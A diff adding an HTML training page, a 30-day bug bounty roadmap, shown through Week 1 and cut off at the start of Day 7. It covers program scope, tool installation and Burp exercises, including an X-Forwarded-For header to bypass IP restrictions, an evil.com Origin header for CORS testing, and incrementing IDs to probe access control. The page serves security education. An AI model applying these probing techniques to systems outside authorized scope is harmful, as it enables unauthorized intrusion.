@@ -1,0 +1,2117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bug Bounty Mastery — 30-Day Roadmap</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg:       #080e1a;
+  --surface:  #0f1929;
+  --card:     #131f30;
+  --card2:    #172338;
+  --border:   #1e3050;
+  --amber:    #f0a500;
+  --amber-d:  #c8880a;
+  --amber-bg: rgba(240,165,0,0.08);
+  --amber-bdr:rgba(240,165,0,0.25);
+  --teal:     #2dd4bf;
+  --teal-bg:  rgba(45,212,191,0.08);
+  --red:      #e05252;
+  --red-bg:   rgba(224,82,82,0.08);
+  --text:     #c8d6e8;
+  --muted:    #4a6080;
+  --white:    #eaf1fb;
+  --mono:     'JetBrains Mono', monospace;
+  --body:     'Inter', sans-serif;
+  --display:  'Syne', sans-serif;
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--body);
+  font-size: 14px;
+  line-height: 1.65;
+  min-height: 100vh;
+}
+
+/* ── HERO ── */
+.hero {
+  position: relative;
+  padding: 56px 24px 48px;
+  text-align: center;
+  border-bottom: 1px solid var(--border);
+  overflow: hidden;
+  background: radial-gradient(ellipse 70% 60% at 50% 0%, rgba(240,165,0,0.07) 0%, transparent 70%);
+}
+
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 10px;
+  letter-spacing: 3px;
+  color: var(--amber);
+  text-transform: uppercase;
+  margin-bottom: 18px;
+  opacity: 0.85;
+}
+
+.hero h1 {
+  font-family: var(--display);
+  font-size: clamp(32px, 6vw, 64px);
+  font-weight: 800;
+  color: var(--white);
+  line-height: 1.05;
+  letter-spacing: -1.5px;
+  margin-bottom: 6px;
+}
+
+.hero h1 em {
+  font-style: normal;
+  color: var(--amber);
+}
+
+.hero-sub {
+  font-size: 15px;
+  color: var(--muted);
+  max-width: 520px;
+  margin: 14px auto 0;
+  font-weight: 300;
+}
+
+/* ── TICKER / STATS ── */
+.stats-row {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+  gap: 1px;
+  background: var(--border);
+  border-top: 1px solid var(--border);
+  border-bottom: 1px solid var(--border);
+}
+
+.stat-cell {
+  background: var(--surface);
+  padding: 18px 20px;
+  text-align: center;
+}
+
+.stat-cell .val {
+  font-family: var(--mono);
+  font-size: 22px;
+  font-weight: 600;
+  color: var(--amber);
+  display: block;
+  line-height: 1;
+}
+
+.stat-cell .lbl {
+  font-size: 10px;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  text-transform: uppercase;
+  margin-top: 5px;
+  font-family: var(--mono);
+}
+
+/* ── PROGRESS ── */
+.progress-wrap {
+  padding: 20px 24px;
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+
+.progress-label {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--muted);
+  letter-spacing: 1px;
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+
+.progress-bar {
+  flex: 1;
+  height: 3px;
+  background: var(--border);
+  border-radius: 2px;
+  overflow: hidden;
+}
+
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--amber-d), var(--amber));
+  border-radius: 2px;
+  transition: width 0.5s ease;
+  width: 0%;
+}
+
+.progress-pct {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--amber);
+  flex-shrink: 0;
+  min-width: 36px;
+  text-align: right;
+}
+
+/* ── LAYOUT ── */
+.layout {
+  display: grid;
+  grid-template-columns: 220px 1fr;
+  min-height: calc(100vh - 260px);
+}
+
+/* ── SIDEBAR ── */
+.sidebar {
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  padding: 24px 0;
+  position: sticky;
+  top: 0;
+  height: 100vh;
+  overflow-y: auto;
+}
+
+.sidebar::-webkit-scrollbar { width: 4px; }
+.sidebar::-webkit-scrollbar-track { background: transparent; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+.phase-group { margin-bottom: 4px; }
+
+.phase-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  color: var(--muted);
+  text-transform: uppercase;
+  padding: 10px 20px 4px;
+  display: block;
+}
+
+.phase-dot {
+  display: inline-block;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  margin-right: 8px;
+  background: var(--border);
+  flex-shrink: 0;
+  transition: background 0.2s;
+}
+
+.week-btn {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  width: 100%;
+  background: none;
+  border: none;
+  padding: 8px 20px;
+  cursor: pointer;
+  color: var(--muted);
+  font-family: var(--body);
+  font-size: 13px;
+  text-align: left;
+  transition: color 0.15s, background 0.15s;
+  position: relative;
+}
+
+.week-btn:hover { color: var(--text); background: var(--amber-bg); }
+
+.week-btn.active {
+  color: var(--amber);
+  background: var(--amber-bg);
+}
+
+.week-btn.active::before {
+  content: '';
+  position: absolute;
+  left: 0; top: 0; bottom: 0;
+  width: 2px;
+  background: var(--amber);
+}
+
+.week-btn.active .phase-dot { background: var(--amber); }
+
+.week-btn .days-tag {
+  font-family: var(--mono);
+  font-size: 9px;
+  margin-left: auto;
+  color: var(--muted);
+  flex-shrink: 0;
+}
+
+/* ── MAIN ── */
+.main-content {
+  padding: 0;
+}
+
+/* ── WEEK PANEL ── */
+.week-panel { display: none; }
+.week-panel.visible { display: block; }
+
+.week-hero {
+  padding: 32px 32px 24px;
+  border-bottom: 1px solid var(--border);
+  background: linear-gradient(135deg, var(--card) 0%, var(--surface) 100%);
+}
+
+.week-meta {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 12px;
+}
+
+.week-phase-tag {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  padding: 3px 10px;
+  border-radius: 2px;
+  border: 1px solid var(--amber-bdr);
+  color: var(--amber);
+  background: var(--amber-bg);
+  text-transform: uppercase;
+}
+
+.week-range {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--muted);
+  letter-spacing: 1px;
+}
+
+.week-hero h2 {
+  font-family: var(--display);
+  font-size: clamp(20px, 3vw, 30px);
+  font-weight: 800;
+  color: var(--white);
+  letter-spacing: -0.5px;
+  margin-bottom: 10px;
+}
+
+.week-objective {
+  font-size: 13px;
+  color: var(--muted);
+  max-width: 680px;
+  line-height: 1.7;
+}
+
+.outcome-box {
+  margin-top: 18px;
+  background: var(--teal-bg);
+  border: 1px solid rgba(45,212,191,0.2);
+  border-radius: 6px;
+  padding: 12px 16px;
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+  max-width: 680px;
+}
+
+.outcome-icon {
+  font-size: 14px;
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+
+.outcome-text {
+  font-size: 12px;
+  color: var(--teal);
+  font-family: var(--mono);
+  line-height: 1.6;
+}
+
+.outcome-text strong {
+  display: block;
+  font-size: 9px;
+  letter-spacing: 2px;
+  margin-bottom: 3px;
+  opacity: 0.7;
+}
+
+/* ── DAY CARDS ── */
+.days-stack {
+  padding: 24px 32px 48px;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.day-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+  transition: border-color 0.2s;
+}
+
+.day-card:hover { border-color: rgba(240,165,0,0.3); }
+.day-card.done { border-color: var(--amber); opacity: 0.75; }
+.day-card.done .day-header { opacity: 0.85; }
+
+.day-header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 14px 18px;
+  cursor: pointer;
+  user-select: none;
+}
+
+.day-num {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--muted);
+  letter-spacing: 1px;
+  width: 44px;
+  flex-shrink: 0;
+}
+
+.day-checkbox {
+  width: 18px;
+  height: 18px;
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  flex-shrink: 0;
+  display: grid;
+  place-items: center;
+  font-size: 10px;
+  cursor: pointer;
+  transition: all 0.15s;
+  color: transparent;
+}
+
+.day-card.done .day-checkbox {
+  background: var(--amber);
+  border-color: var(--amber);
+  color: var(--bg);
+}
+
+.day-title-wrap { flex: 1; min-width: 0; }
+
+.day-title {
+  font-weight: 600;
+  font-size: 14px;
+  color: var(--white);
+  line-height: 1.3;
+}
+
+.day-sub {
+  font-size: 11px;
+  color: var(--muted);
+  margin-top: 1px;
+}
+
+.day-tags {
+  display: flex;
+  gap: 6px;
+  flex-shrink: 0;
+}
+
+.tag {
+  font-family: var(--mono);
+  font-size: 9px;
+  padding: 2px 7px;
+  border-radius: 2px;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+}
+
+.tag-vuln  { background: rgba(224,82,82,0.12);    color: #e08080; border: 1px solid rgba(224,82,82,0.25); }
+.tag-tool  { background: rgba(99,179,237,0.12);   color: #7ec8f7; border: 1px solid rgba(99,179,237,0.25); }
+.tag-recon { background: rgba(154,117,234,0.12);  color: #c4a0f7; border: 1px solid rgba(154,117,234,0.25); }
+.tag-live  { background: rgba(240,165,0,0.12);    color: var(--amber); border: 1px solid var(--amber-bdr); }
+.tag-mindset { background: rgba(45,212,191,0.1);  color: var(--teal); border: 1px solid rgba(45,212,191,0.2); }
+.tag-report { background: rgba(100,200,100,0.1);  color: #80d080; border: 1px solid rgba(100,200,100,0.2); }
+
+.chevron {
+  font-size: 9px;
+  color: var(--muted);
+  transition: transform 0.2s;
+  flex-shrink: 0;
+}
+
+.day-card.open .chevron { transform: rotate(180deg); }
+
+/* ── EXPANDED BODY ── */
+.day-body {
+  display: none;
+  padding: 0 18px 20px 76px;
+  border-top: 1px solid var(--border);
+}
+
+.day-card.open .day-body { display: block; }
+
+.section-block { margin-top: 16px; }
+
+.block-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.block-label::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+.lbl-amber { color: var(--amber); }
+.lbl-teal  { color: var(--teal); }
+.lbl-red   { color: var(--red); }
+.lbl-blue  { color: #7ec8f7; }
+.lbl-purple { color: #c4a0f7; }
+
+.prose {
+  font-size: 13px;
+  color: var(--text);
+  line-height: 1.75;
+}
+
+.prose strong { color: var(--white); font-weight: 600; }
+
+ul.items {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+  margin: 0;
+  padding: 0;
+}
+
+ul.items li {
+  font-size: 13px;
+  color: var(--text);
+  padding-left: 14px;
+  position: relative;
+  line-height: 1.6;
+}
+
+ul.items li::before {
+  content: '›';
+  position: absolute;
+  left: 0;
+  color: var(--amber);
+  font-weight: 600;
+}
+
+ul.items li strong { color: var(--white); }
+
+.code {
+  background: #060d18;
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 13px 15px;
+  font-family: var(--mono);
+  font-size: 11.5px;
+  color: #a8d4ff;
+  line-height: 1.75;
+  overflow-x: auto;
+  margin-top: 8px;
+}
+
+.code .cm { color: var(--muted); }
+.code .hl { color: var(--amber); }
+.code .gr { color: #7fdc8f; }
+.code .rd { color: #e08080; }
+.code .tl { color: var(--teal); }
+
+.outcome-inline {
+  background: var(--teal-bg);
+  border: 1px solid rgba(45,212,191,0.15);
+  border-radius: 5px;
+  padding: 10px 13px;
+  font-size: 12px;
+  color: var(--teal);
+  font-family: var(--mono);
+  margin-top: 8px;
+  line-height: 1.6;
+}
+
+.warn-inline {
+  background: var(--red-bg);
+  border: 1px solid rgba(224,82,82,0.2);
+  border-radius: 5px;
+  padding: 10px 13px;
+  font-size: 12px;
+  color: #e08080;
+  margin-top: 8px;
+  line-height: 1.6;
+}
+
+.chips {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  margin-top: 8px;
+}
+
+.chip {
+  font-family: var(--mono);
+  font-size: 10px;
+  padding: 3px 9px;
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  color: var(--muted);
+  background: var(--surface);
+}
+
+/* ── FOOTER ── */
+footer {
+  border-top: 1px solid var(--border);
+  padding: 28px 32px;
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--muted);
+  letter-spacing: 1px;
+  text-align: center;
+  background: var(--surface);
+}
+
+/* ── RESPONSIVE ── */
+@media (max-width: 700px) {
+  .layout { grid-template-columns: 1fr; }
+  .sidebar { display: none; }
+  .days-stack { padding: 16px; }
+  .week-hero { padding: 20px 16px; }
+  .day-body { padding-left: 18px; }
+  .day-tags { display: none; }
+}
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-eyebrow">Field Roadmap · Zero to Hunter</div>
+  <h1>Bug Bounty<br><em>Mastery</em></h1>
+  <p class="hero-sub">30 days. 4 phases. Built by a practitioner — every day has a clear task, a real outcome, and zero filler.</p>
+</div>
+
+<!-- STATS -->
+<div class="stats-row">
+  <div class="stat-cell">
+    <span class="val">30</span>
+    <span class="lbl">Training Days</span>
+  </div>
+  <div class="stat-cell">
+    <span class="val" id="stat-done">0</span>
+    <span class="lbl">Days Complete</span>
+  </div>
+  <div class="stat-cell">
+    <span class="val">4</span>
+    <span class="lbl">Skill Phases</span>
+  </div>
+  <div class="stat-cell">
+    <span class="val">18+</span>
+    <span class="lbl">Vuln Classes</span>
+  </div>
+  <div class="stat-cell">
+    <span class="val">$0→∞</span>
+    <span class="lbl">Your Ceiling</span>
+  </div>
+</div>
+
+<!-- PROGRESS -->
+<div class="progress-wrap">
+  <span class="progress-label">PROGRESS</span>
+  <div class="progress-bar"><div class="progress-fill" id="pfill"></div></div>
+  <span class="progress-pct" id="ppct">0%</span>
+</div>
+
+<!-- LAYOUT -->
+<div class="layout">
+
+  <!-- SIDEBAR -->
+  <nav class="sidebar">
+    <div class="phase-group">
+      <span class="phase-label">Phase 1 · Foundation</span>
+      <button class="week-btn active" onclick="showWeek('w1',this)">
+        <span class="phase-dot"></span>Week 1 — Ground Zero
+        <span class="days-tag">D1–7</span>
+      </button>
+    </div>
+    <div class="phase-group">
+      <span class="phase-label">Phase 2 · Skill Build</span>
+      <button class="week-btn" onclick="showWeek('w2',this)">
+        <span class="phase-dot"></span>Week 2 — Recon Mastery
+        <span class="days-tag">D8–14</span>
+      </button>
+      <button class="week-btn" onclick="showWeek('w3',this)">
+        <span class="phase-dot"></span>Week 3 — Vuln Deep Dives
+        <span class="days-tag">D15–21</span>
+      </button>
+    </div>
+    <div class="phase-group">
+      <span class="phase-label">Phase 3 · Live Hunting</span>
+      <button class="week-btn" onclick="showWeek('w4',this)">
+        <span class="phase-dot"></span>Week 4 — Hunt &amp; Report
+        <span class="days-tag">D22–30</span>
+      </button>
+    </div>
+
+    <div style="margin-top:32px;padding:0 20px;">
+      <div style="font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:10px;">QUICK REFS</div>
+      <div style="font-size:11px;color:var(--muted);line-height:2;">
+        <div>→ portswigger.net/academy</div>
+        <div>→ hackerone.com/hacktivity</div>
+        <div>→ owasp.org/Top10</div>
+        <div>→ pentester.land</div>
+        <div>→ github.com/swisskyrepo</div>
+        <div>→ gtfobins.github.io</div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- MAIN -->
+  <main class="main-content">
+
+    <!-- ══════════════════ WEEK 1 ══════════════════ -->
+    <div class="week-panel visible" id="w1">
+      <div class="week-hero">
+        <div class="week-meta">
+          <span class="week-phase-tag">Phase 1 · Foundation</span>
+          <span class="week-range">Days 1 – 7</span>
+        </div>
+        <h2>Ground Zero — Mindset, Environment &amp; How It Really Works</h2>
+        <p class="week-objective">Most beginners skip this week. That's why they fail. This week you build the mental model, legal foundation, tooling setup, and note-taking habit that separates hunters who find bugs from those who spin forever without results.</p>
+        <div class="outcome-box">
+          <span class="outcome-icon">🎯</span>
+          <div class="outcome-text">
+            <strong>Week 1 Outcome</strong>
+            You have a working lab, a structured note system, a chosen bug bounty program, and you've read 10 disclosed reports in your target program. You understand the full bug bounty lifecycle from recon to payout.
+          </div>
+        </div>
+      </div>
+
+      <div class="days-stack">
+
+        <!-- DAY 1 -->
+        <div class="day-card" id="d1">
+          <div class="day-header" onclick="toggleDay('d1')">
+            <span class="day-num">DAY 01</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d1')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">How Bug Bounty Actually Works — The Full Picture</div>
+              <div class="day-sub">Platforms, scope, triaging, payouts, and the hunter lifecycle</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-mindset">Mindset</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Bug bounty is not random hacking — it's a disciplined, methodical process. Before touching a single target, you need to understand the ecosystem: how programs work, what gets paid, what gets dismissed, and what gets you banned. Most beginners ignore program rules and waste weeks testing out-of-scope assets.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Learn Today</div>
+              <ul class="items">
+                <li><strong>HackerOne vs Bugcrowd vs Intigriti vs Synack:</strong> understand the differences — public vs invite-only, VDP vs paid programs</li>
+                <li><strong>Scope:</strong> In-scope assets (test these), out-of-scope (never touch these — account termination risk)</li>
+                <li><strong>Severity ratings:</strong> P1 Critical → P5 Informational. Know how CVSS scoring works and how platforms translate it to bounty $</li>
+                <li><strong>Triage process:</strong> Submission → Triage (1-3 days) → Accepted/Duplicate/N/A → Bounty awarded</li>
+                <li><strong>What gets duplicated:</strong> XSS, self-XSS, SPF/DMARC, info disclosure on public endpoints — these are found constantly</li>
+                <li><strong>Disclosed reports:</strong> Visit hackerone.com/hacktivity — read 10 reports today. Note the format, detail level, and how testers communicate impact</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Outcome Check</div>
+              <div class="outcome-inline">You can explain to someone else: what makes a bug in-scope, how severity is determined, and what a triage rejection looks like vs an acceptance. You've read 10 real disclosed reports.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 2 -->
+        <div class="day-card" id="d2">
+          <div class="day-header" onclick="toggleDay('d2')">
+            <span class="day-num">DAY 02</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d2')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Set Up Your Hunter Environment</div>
+              <div class="day-sub">Kali or Parrot, Burp Suite, browser config, note-taking system</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-tool">Tools</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Your environment is your workshop. Slow tools, missing extensions, and no note system will sabotage you mid-hunt. Build this once, correctly. You'll use every component of this setup for the next 30 days and beyond.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Setup Checklist</div>
+              <ul class="items">
+                <li><strong>OS:</strong> Kali Linux (VM or bare metal) or Parrot OS. Minimum 8GB RAM for VM. Snapshot your clean state.</li>
+                <li><strong>Burp Suite Community:</strong> Install, configure browser proxy (127.0.0.1:8080), install CA cert in Firefox — test it intercepts a request before moving on</li>
+                <li><strong>Firefox extensions:</strong> FoxyProxy (proxy switching), Wappalyzer (tech fingerprinting), Cookie Editor, uBlock Origin</li>
+                <li><strong>Note system:</strong> Obsidian (recommended) or CherryTree. Create this template: Target → Scope → Endpoints Found → Findings → Evidence → Submission Status</li>
+                <li><strong>Screenshot tool:</strong> Flameshot (Linux) — bind to a hotkey. Every finding needs a screenshot chain before you submit</li>
+                <li><strong>Terminal setup:</strong> Install tmux, set up panes — one for active tool, one for notes/output</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Core Tools to Install Now</div>
+              <div class="code">
+<span class="cm"># One-shot install for day-1 toolkit</span>
+<span class="gr">sudo apt update && sudo apt install -y \</span>
+  nmap ffuf gobuster amass subfinder \
+  httpx-toolkit nuclei python3-pip \
+  jq curl wget git tmux flameshot
+
+<span class="cm"># Go tools (essential for modern bug bounty)</span>
+<span class="gr">go install github.com/projectdiscovery/katana/cmd/katana@latest</span>
+<span class="gr">go install github.com/tomnomnom/waybackurls@latest</span>
+<span class="gr">go install github.com/tomnomnom/gf@latest</span>
+<span class="gr">go install github.com/hakluke/hakrawler@latest</span>
+
+<span class="cm"># Add Go bin to PATH</span>
+<span class="gr">echo 'export PATH=$PATH:~/go/bin' >> ~/.zshrc && source ~/.zshrc</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Outcome Check</div>
+              <div class="outcome-inline">Burp is intercepting traffic. You have a note template ready. All tools install without errors. You can open a terminal, split it with tmux, and run a basic ffuf command.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 3 -->
+        <div class="day-card" id="d3">
+          <div class="day-header" onclick="toggleDay('d3')">
+            <span class="day-num">DAY 03</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d3')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Web Fundamentals — How the Web Works for Hackers</div>
+              <div class="day-sub">HTTP, cookies, sessions, headers, request/response lifecycle</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-mindset">Mindset</span><span class="tag tag-tool">Core</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">You cannot exploit what you don't understand. Every web vulnerability is an HTTP request gone wrong. Understanding sessions, cookies, headers, and the request lifecycle is the foundation every advanced technique is built on.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Topics to Master Today</div>
+              <ul class="items">
+                <li><strong>HTTP methods:</strong> GET, POST, PUT, DELETE, PATCH, OPTIONS — and when each is used (APIs especially)</li>
+                <li><strong>Status codes that matter:</strong> 200, 201, 301/302, 400, 401, 403, 404, 429, 500 — and what each signals to a hunter</li>
+                <li><strong>Headers to know:</strong> Authorization, Cookie, Content-Type, Origin, Referer, X-Forwarded-For, Host, Content-Security-Policy, Access-Control-Allow-Origin</li>
+                <li><strong>Session management:</strong> How cookies work, HttpOnly/Secure flags, SameSite attribute — each flag affects a different attack class</li>
+                <li><strong>CORS:</strong> What it is, why misconfigurations matter, what an open CORS header actually lets an attacker do</li>
+                <li><strong>Burp practice:</strong> Intercept a login, see the POST body. Change a cookie value. Observe a 302 redirect.</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Burp Exercise</div>
+              <div class="code">
+<span class="cm"># In Burp Repeater — modify these on any site and observe responses:</span>
+
+<span class="hl">1.</span> Change GET → POST on a search endpoint
+<span class="hl">2.</span> Add: X-Forwarded-For: 127.0.0.1 (bypass IP-based restrictions)
+<span class="hl">3.</span> Add: Origin: https://evil.com  (test CORS)
+<span class="hl">4.</span> Change Content-Type: application/json → text/xml
+<span class="hl">5.</span> Modify a cookie value — observe if validation breaks
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 4 -->
+        <div class="day-card" id="d4">
+          <div class="day-header" onclick="toggleDay('d4')">
+            <span class="day-num">DAY 04</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d4')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Choose Your Program — How to Pick a Target That Pays</div>
+              <div class="day-sub">Program selection strategy, scope analysis, reading policy documents</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-live">Strategy</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Program selection is where most beginners make their first fatal mistake — they either pick a huge target with millions of hunters (brutal competition) or a tiny scope with nothing to find. Picking the right program at the right time is a skill in itself.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Selection Criteria</div>
+              <ul class="items">
+                <li><strong>Wide scope beats high payout</strong> early on — you need surface area to find things</li>
+                <li><strong>Response time:</strong> Sort HackerOne programs by "Average Bounty" AND "Average Response Time" — slow responders kill momentum</li>
+                <li><strong>Recently launched programs:</strong> Less competition, lower duplicate rate</li>
+                <li><strong>Asset types you're comfortable with:</strong> web app vs API vs mobile — pick one and go deep</li>
+                <li><strong>Read the policy document completely:</strong> Note every out-of-scope item and what specific vulnerabilities they won't pay for (rate limiting, self-XSS, etc.)</li>
+                <li><strong>Your starter picks:</strong> HackerOne — US DoD (very wide scope, low competition), any mid-size SaaS with recent launch</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Outcome Check</div>
+              <div class="outcome-inline">You have 1 primary program chosen and written down in your notes. You've read the entire policy and marked what's in/out of scope. You know the max payout for Critical and High findings.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 5 -->
+        <div class="day-card" id="d5">
+          <div class="day-header" onclick="toggleDay('d5')">
+            <span class="day-num">DAY 05</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d5')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Burp Suite Deep Dive — Your Primary Weapon</div>
+              <div class="day-sub">Proxy, Repeater, Intruder, Scanner, extensions</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-tool">Tools</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Burp Suite is open for 100% of your time hunting. Not knowing it cold costs you hours per session. Today you go from "knows the basics" to "flows through Burp without thinking."</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Master These Burp Features</div>
+              <ul class="items">
+                <li><strong>Proxy / Intercept:</strong> Toggle on/off without touching the mouse. Forward, Drop, Action shortcuts.</li>
+                <li><strong>Repeater:</strong> Send every intercepted request here. Change one parameter at a time. Read every response in full — headers + body.</li>
+                <li><strong>Intruder (rate-limited in Community — use ffuf instead):</strong> Understand payload positions, attack types (Sniper, Cluster Bomb)</li>
+                <li><strong>Target → Site Map:</strong> Browse your target with proxy on — map every endpoint automatically</li>
+                <li><strong>Decoder:</strong> Base64, URL-encode, HTML-encode. Know these cold — encoded values hide in parameters everywhere.</li>
+                <li><strong>Comparer:</strong> Diff two responses to spot subtle differences in auth checks</li>
+                <li><strong>Extensions to install (BApp Store):</strong> Autorize (IDOR testing), Param Miner (hidden params), Logger++ (full request log), Turbo Intruder (fast fuzzing), Active Scan++</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Practice Tasks</div>
+              <div class="code">
+<span class="cm"># Tasks to complete in Burp today:</span>
+<span class="hl">1.</span> Intercept a login → send to Repeater → change password → observe
+<span class="hl">2.</span> Find a numeric ID in a URL → send to Repeater → increment by 1, 2, 3
+<span class="hl">3.</span> Use Decoder to base64-decode a cookie value
+<span class="hl">4.</span> Enable Logger++ → browse target → export full request log
+<span class="hl">5.</span> Install Autorize → set up two accounts → test access control
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 6 -->
+        <div class="day-card" id="d6">
+          <div class="day-header" onclick="toggleDay('d6')">
+            <span class="day-num">DAY 06</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d6')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">The Hunter Mindset — How Top Earners Think</div>
+              <div class="day-sub">Impact-first thinking, where bugs actually live, patience vs frustration</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-mindset">Mindset</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">The biggest skill gap isn't technical — it's mental. Top hunters think in business impact, not just technical payloads. They ask "what could go wrong here for the company?" before "what payload breaks this?" This shift changes what you test and what you find.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Core Mental Frameworks</div>
+              <ul class="items">
+                <li><strong>Think like the developer, not the attacker:</strong> What shortcuts did they take? What did they forget to validate? What's the "happy path" vs edge cases?</li>
+                <li><strong>Feature → Attack surface mapping:</strong> Every new feature = new attack surface. File upload? Think path traversal, stored XSS, SSRF. Export? Think IDOR, data exposure. SSO? Think account takeover.</li>
+                <li><strong>Where bugs concentrate:</strong> New features (less tested), mobile APIs (often less secure than web), admin functionality, payment flows, file operations, search, import/export</li>
+                <li><strong>The 80/20 of bug bounty:</strong> 80% of paid bugs are IDOR, SQLi, XSS, SSRF, auth bypass. Master these first.</li>
+                <li><strong>Duplicate avoidance:</strong> Check program's hacktivity before testing obvious endpoints. Test less-obvious flows instead.</li>
+                <li><strong>Your daily habit:</strong> 30 min reading disclosed reports → 2hr active testing → 30 min documenting</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 7 -->
+        <div class="day-card" id="d7">
+          <div class="day-header" onclick="toggleDay('d7')">
+            <span class="day-num">DAY 07</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d7')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Week 1 Review + OWASP Top 10 Deep Read</div>
+              <div class="day-sub">Consolidate foundation, map your learning gaps</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-mindset">Review</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
